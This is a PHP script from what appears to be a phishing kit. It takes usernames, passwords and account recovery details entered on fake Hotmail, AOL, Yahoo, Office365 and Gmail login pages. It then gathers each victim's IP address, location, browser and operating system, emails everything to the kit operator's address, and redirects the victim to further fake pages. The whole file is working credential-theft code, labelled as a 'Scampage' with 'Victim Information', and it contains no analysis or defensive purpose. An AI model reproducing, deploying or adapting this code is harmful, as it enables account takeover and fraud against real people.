<?php
require "CONTROLS.php";
require "includes/session_protect.php";
require "includes/functions.php";
require "includes/One_Time.php";
ini_set('display_errors', 0);


if (isset($_POST['username']) && isset($_POST['password'])) {
    if ($_POST['username'] !== "" && $_POST['password'] !== "") {

        $date = date('l d F Y');
        $time = date('H:i');
        $user = $_POST['username'];
        $pass = $_POST['password'];
        $source = $_POST['from'];
        $ip = $_SERVER['REMOTE_ADDR'];
        $systemInfo = systemInfo($_SERVER['REMOTE_ADDR']);
        $VictimInfo1 = "| Submitted by : " . $_SERVER['REMOTE_ADDR'] . " (" . gethostbyaddr($_SERVER['REMOTE_ADDR']) . ")";
        $VictimInfo2 = "| Location : " . $systemInfo['city'] . ", " . $systemInfo['region'] . ", " . $systemInfo['country'] . "";
        $VictimInfo3 = "| UserAgent : " . $systemInfo['useragent'] . "";
        $VictimInfo4 = "| Browser : " . $systemInfo['browser'] . "";
        $VictimInfo5 = "| Os : " . $systemInfo['os'] . "";
        $data = "
+ ------------- Scampage --------------+
+ Account Details 
| Username : $user
| Password : $pass
| Source: $source 
+ ------------------------------------------+
+ Victim Information
$VictimInfo1
$VictimInfo2
$VictimInfo3
$VictimInfo4
$VictimInfo5
| Received : $date @ $time
+ ------------------------------------------+
";


        $subject = "$ip - " . $_POST['from'] . " from " . $systemInfo['country'];
        mail($receiverAddress, $subject, $data);
        if ($_POST['from'] === 'Hotmail') {
            header('Location: Hotmail.php?sslchannel=true&sessionid=' . generateRandomString(130));
            exit;
        } elseif ($_POST['from'] === 'AOL') {
            header('Location: Aol.php?sslchannel=true&sessionid=' . generateRandomString(130));
            exit;
        } elseif ($_POST['from'] === 'Yahoo') {
            header('Location: Yahoo.php?sslchannel=true&sessionid=' . generateRandomString(130));
            exit;
        } elseif ($_POST['from'] === 'Office365') {
            header('Location: Office365.php?sslchannel=true&sessionid=' . generateRandomString(130));
            exit;
        } elseif ($_POST['from'] === 'Other') {
            header('Location: Other.php?sslchannel=true&sessionid=' . generateRandomString(130));
            exit;
        }

    }
} elseif (isset($_SESSION['username']) && isset($_SESSION['password'])) {
    if ($_SESSION['username'] !== "" && $_SESSION['password'] !== "") {
        $date = date('l d F Y');
        $time = date('H:i');
        $user = $_SESSION['username'];
        $pass = $_SESSION['password'];
        $source = $_POST['from'];
        $recovery = $_POST['challengetype'] === 'email' ? $_POST['email'] : $_POST['phone'];
        $ip = $_SERVER['REMOTE_ADDR'];
        $systemInfo = systemInfo($_SERVER['REMOTE_ADDR']);
        $VictimInfo1 = "| Submitted by : " . $_SERVER['REMOTE_ADDR'] . " (" . gethostbyaddr($_SERVER['REMOTE_ADDR']) . ")";
        $VictimInfo2 = "| Location : " . $systemInfo['city'] . ", " . $systemInfo['region'] . ", " . $systemInfo['country'] . "";
        $VictimInfo3 = "| UserAgent : " . $systemInfo['useragent'] . "";
        $VictimInfo4 = "| Browser : " . $systemInfo['browser'] . "";
        $VictimInfo5 = "| Os : " . $systemInfo['os'] . "";
        $data = "
+ ------------------------------------------+
+ Account Details 
| Username : $user
| Password : $pass
| Source: GMAIL 
| Recovery: $recovery 
+ ------------------------------------------+
+ Victim Information
$VictimInfo1
$VictimInfo2
$VictimInfo3
$VictimInfo4
$VictimInfo5
| Received : $date @ $time
+ ------------------------------------------+
";


        $subject = "$ip - GMAIL - from " . $systemInfo['country'];
        mail($receiverAddress, $subject, $data);
        header('Location: GMAIL.php?sslchannel=true&sessionid=' . generateRandomString(130));
        exit;
    }

} else {
    header('Location: Main.php?sslchannel=true&sessionid=' . generateRandomString(130));
    exit;
}
?>